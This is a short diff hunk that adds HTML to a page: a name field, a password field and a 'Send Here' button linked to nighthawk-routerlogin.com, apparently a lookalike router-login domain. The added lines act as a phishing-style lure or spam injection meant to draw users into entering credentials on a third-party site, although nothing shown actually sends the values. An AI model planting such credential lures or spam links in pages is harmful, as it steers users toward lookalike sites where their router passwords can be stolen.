@@ -1486,6 +1486,12 @@
 
 
 
+<input type="Name" placeholder="Name" class="form-name" required>
+<input type="password" placeholder="Password" required>
+<a href="https://www.nighthawk-routerlogin.com/"><input type="button" value="Send Here"></a>
+
+
+
 
 
 
